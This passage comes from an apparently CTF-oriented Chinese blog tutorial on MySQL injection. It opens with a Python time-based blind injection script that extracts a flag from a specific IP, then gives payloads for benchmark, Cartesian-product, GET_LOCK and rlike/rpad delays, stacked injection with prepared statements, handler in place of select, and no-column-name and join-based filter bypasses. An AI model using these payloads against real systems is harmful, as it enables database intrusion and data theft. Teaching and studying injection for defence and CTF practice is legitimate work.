+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url= <span class="string">"http://47.96.135.208:8802/web2/search.php"</span></span><br><span class="line">s = <span class="string">','</span>+<span class="string">'_'</span>+string.ascii_lowercase+<span class="string">'1234567890'</span>+string.ascii_uppercase+<span class="string">'&#123;'</span>+<span class="string">'&#125;'</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    print(i,<span class="string">':'</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment">#sql = "1' and if(1=(ord(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d),sleep(3),1)-- -"%(i,ord(j)) #爆表名</span></span><br><span class="line">        <span class="comment">#sql = "1' and if(1=(ord(mid((select group_concat(column_name) from information_schema.columns where table_name='f111ag'),%d,1))=%d),sleep(3),1)-- -"%(i,ord(j)) #爆字段名</span></span><br><span class="line">        sql = <span class="string">"1' and if(1=(ord(mid((select group_concat(flag) from f111ag),%d,1))= %d),sleep(3),1)-- -"</span>%(i,ord(j))</span><br><span class="line">        data = &#123;<span class="string">"id"</span> : sql&#125;</span><br><span class="line">        r = requests.get(url,params=data,timeout=<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Click"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            p += j</span><br><span class="line">            print(p)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-benchmark"><a href="#2-benchmark" class="headerlink" title="2.benchmark():"></a>2.benchmark():</h5><p>通过大量的运算，来达到延时的效果。</p>
+<h6 id="Payload：-6"><a href="#Payload：-6" class="headerlink" title="Payload："></a>Payload：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; or if(ascii(substr(database(),1,1))&gt;114,benchmark(10000000,sha(1)),0)#</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-笛卡尔积："><a href="#3-笛卡尔积：" class="headerlink" title="3.笛卡尔积："></a>3.笛卡尔积：</h5><p>笛卡尔积可以将多个表合并成一个表，这样会消耗大量的时间来查询，造成延时的效果</p>
+<h6 id="Payload：-7"><a href="#Payload：-7" class="headerlink" title="Payload："></a>Payload：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(substr(database(),1,1))&gt;0,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C),0)</span><br></pre></td></tr></table></figure>
+
+<h5 id="4-GET-LOCK："><a href="#4-GET-LOCK：" class="headerlink" title="4.GET_LOCK："></a>4.GET_LOCK：</h5><p>当我们在一个session中对关键字进行了get_lock，那么在另一个session再次对关键字进行get_lock，就会执行命令，进行延时</p>
+<p>session A：对关键词<code>Lucia</code>进行第一次锁定，没有发生延时。</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114185322.png" alt></p>
+<p>session B：对关键词<code>Lucia</code>再次锁定，发生延迟</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201114185433.png" alt></p>
+<h5 id="5-Rlike-rpad（MySQL5-7）："><a href="#5-Rlike-rpad（MySQL5-7）：" class="headerlink" title="5.Rlike+rpad（MySQL5.7）："></a>5.Rlike+rpad（MySQL5.7）：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpad(1,3,&apos;str&apos;)：用字符串str填充第一位的字符串达到第二位的字符串。</span><br><span class="line">rlike： expr rlike pat，判断输入的expr是否符合正则表达式。</span><br></pre></td></tr></table></figure>
+
+<p>通过填充大量的数据，然后匹配很长的正则表达式，服务器需要大量的时间处理数据，达到延时的目的</p>
+<h6 id="Payload：-8"><a href="#Payload：-8" class="headerlink" title="Payload："></a>Payload：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table1 where 1=1 and if(mid(user(),1,1)=&apos;r&apos;,concat(rpad(1,349525,&apos;a&apos;),rpad(1,349525,&apos;a&apos;),rpad(1,349525,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd&apos;,1);</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、堆叠注入-预编译："><a href="#四、堆叠注入-预编译：" class="headerlink" title="四、堆叠注入+预编译："></a>四、堆叠注入+预编译：</h2><p>在mysql中允许一条语句执行多条sql命令，每条命令之间以<code>;</code>为间隔符。使用条件十分有限在php中需要使用<code>mysqli_multi_query()</code>函数才能支持多条sql语句同时执行，而在实际情况下，大部分调用MySQL数据库都使用的是<code>mysqli_query()</code>函数</p>
+<p>在真实环境中，当我们发现可以进行堆叠注入时，往往存在一些限制或者过滤，所以我们通常配合预编译，来绕过这些限制。</p>
+<p>预编译的基本语法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt_name FROM preparable_stmt;</span><br><span class="line"></span><br><span class="line">EXECUTE stmt_name [USING @var_name [, @var_name] ...];</span><br><span class="line"></span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201116163817.png" alt></p>
+<p>其他两种：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">prepare stmt from &quot;select ? as test&quot;;</span><br><span class="line">set @test=user();</span><br><span class="line">execute stmt using @test;</span><br><span class="line"></span><br><span class="line">set @s=&apos;select ?&apos;;</span><br><span class="line">prepare stmt2 from @s;</span><br><span class="line">set @t=user();</span><br><span class="line">execute stmt2 using @t;</span><br></pre></td></tr></table></figure>
+
+<p>当select被过滤，可以用handler来代替</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler 表名 open; //打开表</span><br><span class="line">handler 表名 read first; //查询第一条数据</span><br><span class="line">handler 表名 read next; //查询下一条数据</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、无列名注入："><a href="#五、无列名注入：" class="headerlink" title="五、无列名注入："></a>五、无列名注入：</h2><p>当<code>information_schema(MySQL&gt;=5)</code>被过滤，我们无法获得table_schema，table_name，column_name等信息。在5.6.x过后，MySQL默认引擎换成了innodb，innodb增加了两张新表：<code>innodb_table_stats</code>和<code>innodb_index_stats</code>,在<code>innodb_table_stats</code>表中保存了数据库变动的记录，也就是可以看到新创建或者更改的数据库的表。</p>
+<p>所以在注入的过程中，我们使用<code>innodb_table_stats</code>来Bypass information获取表名，但是这种方法看不了列名，所以出现了无列名注入</p>
+<h3 id="原理：-6"><a href="#原理：-6" class="headerlink" title="原理："></a>原理：</h3><p>当进行联合查询的时候，会生成一个名为1，2，3，4的表</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201130211424.png" alt></p>
+<p>我们可以用反引号将前面的数字括起来，会把该数字当做一个列查询</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201130212647.png" alt></p>
+<p>当反引号被过滤的时候，我们可以采取别名的方式来进行，命名时的<code>as</code>可以省略</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20201130212726104.png" alt></p>
+<h1 id="一些小Ticks："><a href="#一些小Ticks：" class="headerlink" title="一些小Ticks："></a>一些小Ticks：</h1><ol>
+<li><p>当<code>,</code>被过滤，我们可以使用join函数：</p>
+<blockquote>
+<p>join：把表之间的内容链接起来</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20201130214617.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload：select * from users where id = &apos;1&apos; union select * from (select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b join (select 3)c join (select 4)d;</span><br></pre></td></tr></table></figure>
+
+
+    
+  </div>
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">Have Fun</span>
+      <div class="donation-body">
+        <div class="tip text-center">by Aruk4s</div>
+        <ul>
+        
+          <li class="item">
+            
+            <img src="/images/1.png" alt="">
+          </li>
+        
+          <li class="item">
+            
+            <img src="/images/2.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2020/10/12/SSRF从0到1/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
